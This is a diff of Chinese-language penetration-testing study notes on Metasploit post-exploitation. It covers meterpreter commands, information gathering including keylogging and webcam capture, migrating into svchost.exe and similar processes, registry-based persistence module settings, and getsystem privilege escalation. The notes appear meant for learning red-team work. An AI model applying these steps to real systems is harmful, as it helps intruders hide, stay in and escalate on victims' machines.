@@ -1,3 +1,42 @@
+注意：
+（一）post的主力肯定是meterpreter的命令。
+
+
+
+（二）run命令详解：
+0 切记区分清除exploit和run这两个命令，exploit用于msf，run用于meterpreter。在很多rat里，模块都用run这个命令执行，但是msf里只有exploit命令才能执行模块，run仅作用meterpreter里。
+
+1 run可以run谁？
+（1）meterepreter脚本：
+在哪？.../metatsploit-framework/scripts/meterpreter
+功能：除了一些msf自带的脚本外，你也可以自定义脚本（使用ruby语言）并将其放入.../metatsploit-framework/scripts/meterpreter目录中，就可以使用它们了。
+用法：
+在meterpreter命令行，
+run <script-name>，
+就可让脚本在目标机上运行。
+（2）meterpreter的各种命令
+实际上，run <meterpreter-cmd> == <meterpreter-cmd>
+
+2 不能run谁？关于脚本这一点请注意：其实exploit、payload这些不也是脚本吗？是的，他们其实也是脚本，但是请不要run它们，请直接执行它们，这是血的教训，请牢记。
+
+
+
+（三）甚至meterpreter提供了ruby shell接口（对应post的railgun模块），你可以在meterpreter里键入irb打开一个target的irb shell，并与之交互，
+
+
+
+（四）对于Linux系统，shell命令更常用，
+
+
+
+（五）也会用到msf的post一级模块但真不多，这个一级模块名为post但实际上却不常被使用因为命令和脚本更方便。
+
+
+
+
+
+
+
 零 免杀：详见《msf制毒》
 
 
@@ -6,11 +45,139 @@
 
 
 
-一 持久化
-0 就是在target上找个目录放个脚本和exe，持久化意味着木马必须在硬盘上保存，因而持久化和静态免杀是一对天然的矛盾。
+一 信息搜集
+（一）文件上传下载：upload、download
+注意使用UNC。
+
+
+
+（二）搜索文件：search
+
+
+
+（三）用户信息搜集：net user
+
+
+
+（四）bash的历史文件：一般在家目录下，是.bash_history。
+
+
+
+（五）webcam、键盘记录等手段。
+
+
+
+
+
+
+
+二 持久化（更宽泛的概念应该叫权限维持）
+（一）进程迁移
+0 意义：当回连时，最好先进行一番进程迁移，将其迁移到一些常见的不会被用户马上关闭的后台进程里，也是权限维持的一个方法。
+
+1 原理：进程注入，至于是怎么注入的，是ptrace还是dll，这不知道。
+
+2 进程迁移的方法
+（1）ps查看目标机上的进程
+你需要指定目标进程或进程名，以下是Windows中的一些常见后台进程：
+svchost.exe：宿主进程，承载多个Windows服务，是系统中非常重要的进程。
+explorer.exe：Windows文件资源管理器，负责用户界面，包括任务栏和桌面。
+services.exe：管理系统服务，负责启动和停止各种后台服务。
+winlogon.exe：处理用户登录和注销，确保用户会话的安全。
+csrss.exe：客户端/服务器运行时子系统，负责管理图形和控制台窗口。
+dllhost.exe：COM Surrogate进程，用于托管COM对象。
+Background Intelligent Transfer Service (BITS)：用于后台下载和上传的服务，通常在Windows更新中使用。
+Windows Update Service (wuauserv)：负责自动下载和安装Windows更新。
+Antivirus Software Processes：如Windows Defender的相关进程，确保系统安全。
+Task Scheduler (taskschd.msc)：管理计划任务的进程，自动执行指定任务。
+（2）migrate <<pid> | -P <pid> | -N <name>> [-t timeout]
+
+
+
+（二）持久化原理和方法
+0 原理就是在target上找个目录放个脚本和exe，持久化意味着木马必须在硬盘上保存，因而持久化和静态免杀是一对天然的矛盾。
 
 1 use exploit/windows/local/persistence
 
-2 set SESSION <会话id>
+2 配置
+（1）必要
+set DisablePayloadHandler false
+set SESSION <会话id>
+（2）选择
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   DELAY     10               yes       Delay (in seconds) for persistent payload to keep reconnecting back.   // 断连后多长时间回连一次，默认10s
+   EXE_NAME                   no        The filename for the payload to be used on the target host (%RAND%.exe by default).   // 木马名称，默认就是你原来的那个，而且位置也不会变
+   PATH                       no        Path to write payload (%TEMP% by default).   // 加载脚本所存储的目录，默认在c:\users\user-name\appdata\local\temp
+   REG_NAME                   no        The name to call registry value for persistence on target host (%RAND% by default).   // 这里体现了采用的持久化方法是修改注册表，至于更进一步的原理，再议
+   STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM)   // 在什么时候回连，有USER, SYSTEM，SYSTEM需要受害者以administrator权限运行payload才能生效
+   VBS_NAME                   no        The filename to use for the VBS persistent script on the target host (%RAND% by default).   // 加载脚本名字，默认随机
 
 3 exploit
+
+
+
+（三）回连时自动持久化：
+1 在你的监听器。
+
+2 配置
+（1）set DisablePayloadHandler true
+（2）set AutoRunScript run  exploit/windows/local/persistence LHOST=<this-listen-ip-addr> LPORT=<this-listen-port> payload=<your payload's payload>
+注：
+（0）端口和ip设置为本监听器的端口和ip，我本以为可以设置为其他的端口和ip但是经测试不行，不管你设置成谁，回连都是走本监听器，另外ip地址可以省略因为有默认指，但是端口一定要记得设置。
+（1）不用设置SESSION了，也可以设置除了SESSION以外其他的选项也就是上面的”（2）选择“中的选项。
+（2）为什么一定要开启DisablePayloadHandler，因为在设置自动持久化时我们并不知道SESSION是多少。但是，SESSION id也可以使用程序的方式获取的，如果你执意要使用（二）的方法配置自动持久化，请写一个rb脚本去获取session_id并将其作为参数传给set exploit/windows/local/persistence SESSION=#{session_id}。
+
+3 exploit
+
+
+
+（四）测试结果：只能说断了网能连回来，但是目标机这边一旦进程死了就废了。
+
+
+
+（五）其它持久化模块
+exploit/windows/local/persistence_service：它需要root，经测试不行
+exploit/windows/local/registry_persistence
+exploit/windows/local/persistence_image_exec_options
+
+
+
+（六）我发现set和cs生成的hta马可以自行开机自启。
+
+
+
+
+
+
+
+三 提权（LPE，就是local）
+（零）基本命令：
+0 查看当前权限：getuid
+
+1 getsystem
+
+
+
+（一）exploit/<os>/local/下有很多用于提权的模块。
+注：local是权限模块，包括权限维持和权限提升。
+
+
+
+（二）其实更多时候提权使用的是各种shell命令。
+
+
+
+
+
+
+
+四 横移
+
+
+
+
+
+
+
+五 隧道
